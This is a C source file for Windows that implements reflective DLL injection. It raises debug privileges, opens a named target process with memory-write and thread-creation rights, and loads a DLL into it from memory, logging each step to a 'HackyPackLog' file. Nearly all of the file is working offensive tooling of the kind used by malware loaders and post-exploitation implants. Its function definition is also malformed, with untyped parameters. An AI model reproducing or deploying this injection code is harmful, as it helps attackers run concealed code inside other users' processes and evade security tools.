#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include "LoadLibraryR.h"

#pragma comment(lib,"Advapi32.lib")


DWORD ProcesstoPid(char *Processname);

int main(int argc, char * argv[])
{

	char* cpDllFile = "ReflectDll_Dll.dll";
	char* ProcessName = "12345.exe";
	BOOL x = InjectDll(cpDllFile, ProcessName);


	return 0;
}

BOOL InjectDll(cpDllFile, ProcessName)
{
	FILE *fp = NULL;
	fp = fopen("HackyPackLog.log", "a");
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	
	
	DWORD dwBytesRead = 0;

	//将进程名转化为PID
	DWORD dwProcessId = ProcesstoPid(ProcessName);
	TOKEN_PRIVILEGES priv = { 0 };

	HANDLE hFile = NULL;
	hFile = CreateFileA(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		fprintf(fp, "[!]InjectDll--->CreateFileA...failed:%d\n",GetLastError());

	DWORD dwLength = 0;
	dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
		fprintf(fp, "[!]InjectDll--->GetFileSize...failed:%d\n", GetLastError());

	LPVOID lpBuffer = NULL;
	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer)
		fprintf(fp, "[!]InjectDll--->HeapAlloc...failed:%d\n", GetLastError());

	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE)
		fprintf(fp, "[!]InjectDll--->ReadFile...failed:%d\n", GetLastError());

	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

		CloseHandle(hToken);
	}



	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
		fprintf(fp, "[!]InjectDll--->OpenProcess...failed:%d\n", GetLastError());

	hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule)
		fprintf(fp, "[!]InjectDll--->LoadRemoteLibraryR...failed:%d\n", GetLastError());

	fprintf(fp,"[*]Injected the '%s' DLL into process %d\n", cpDllFile, dwProcessId);

	WaitForSingleObject(hModule, -1);


	if (lpBuffer)
		HeapFree(GetProcessHeap(), 0, lpBuffer);

	if (hProcess)
		CloseHandle(hProcess);

	fclose(fp);
	return TRUE;
}


DWORD ProcesstoPid(char *Processname) //查找指定进程的PID(Process ID)
{
	HANDLE hProcessSnap = NULL;
	DWORD dwProcessId = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot:%d\n", GetLastError());
		return NULL;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);   //初始化PROCESSENTRY32结构体
	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			if (!lstrcmp(pe32.szExeFile, Processname))
			{
				dwProcessId = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	else
	{
		printf("Process32First:%d\n", GetLastError());
		return NULL;
	}
	CloseHandle(hProcessSnap);
	return dwProcessId;
}